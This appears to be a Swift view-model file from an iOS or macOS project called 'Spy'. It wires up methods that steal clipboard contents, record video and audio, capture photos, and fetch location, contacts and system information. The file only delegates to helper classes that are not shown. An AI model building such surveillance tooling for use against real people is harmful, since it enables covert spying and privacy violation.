//
//  PluginsListViewModel.swift
//  Spy
//
//  Created by Paula Waleska on 23/2/25.
//

protocol PluginsListViewModel {
    func stealClipboard()
    func fetchSystemInfo()
    func recordVideo()
    func capturePhoto()
    func recordAudio()
    func fetchLocation()
    func fetchContacts()
}

final class PluginsListViewModelImpl: PluginsListViewModel {
    private var clipboardStealer: ClipboardStealer
    private var systemInfoFetcher: SystemInfoFetcher
    private var cameraMicrophoneAccess: CameraMicrophoneAccess
    private var photoCapturer: CapturePhoto
    private var audioRecorder: RecordAudio
    private var locationFetcher: LocationFetcher
    private var contactsFetcher: ContactsFetcher
    
    init(
        clipboardStealer: ClipboardStealer = ClipboardStealer(),
        systemInfoFetcher: SystemInfoFetcher = SystemInfoFetcher(),
        cameraMicrophoneAccess: CameraMicrophoneAccess = CameraMicrophoneAccess(),
        capturePhoto: CapturePhoto = CapturePhoto(),
        recordAudio: RecordAudio = RecordAudio(),
        locationFetcher: LocationFetcher = LocationFetcher(),
        contactsFetcher: ContactsFetcher = ContactsFetcher()
    ){
        self.clipboardStealer = clipboardStealer
        self.systemInfoFetcher = systemInfoFetcher
        self.cameraMicrophoneAccess = cameraMicrophoneAccess
        self.photoCapturer = capturePhoto
        self.audioRecorder = recordAudio
        self.locationFetcher = locationFetcher
        self.contactsFetcher = contactsFetcher
    }
    
    func stealClipboard() {
        clipboardStealer.execute()
    }
    
    func fetchSystemInfo() {
        try? systemInfoFetcher.execute()
    }
    
    func videoAndAudioRecorder() {
        try? cameraMicrophoneAccess.execute()
    }
    
    func recordVideo() {
        try? cameraMicrophoneAccess.execute()
    }
    
    func capturePhoto() {
        photoCapturer.execute()
    }
    
    func recordAudio() {
        audioRecorder.execute()
    }
    
    func fetchLocation() {
        try? locationFetcher.execute()
    }
    
    func fetchContacts() {
        try? contactsFetcher.execute()
    }
}
